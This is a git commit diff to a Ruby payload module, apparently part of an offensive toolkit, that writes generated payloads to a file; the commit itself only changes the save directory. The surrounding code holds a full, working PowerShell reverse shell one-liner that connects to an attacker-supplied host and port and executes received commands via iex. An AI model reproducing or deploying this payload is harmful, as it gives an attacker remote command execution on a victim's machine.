f97d0fc0ae91c79b2be70c57ff291c6696c98640
Ivan Nikolsky <54115104+enty8080@users.noreply.github.com>
2020-05-02 15:43:45 +0300

    Update powershell.rb

--- etc/modules/payload/powershell.rb
+++ etc/modules/payload/powershell.rb
@@ -54,6 +54,8 @@ begin
     sleep(1)
     puts "#{g}Saving to #{file}..."
     sleep(0.5)
+    w = ENV['OLDPWD']
+    Dir.chdir(w)
     open(file, 'w') { |f|
         f.puts "$client = New-Object System.Net.Sockets.TCPClient(#{host},#{port});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
     }
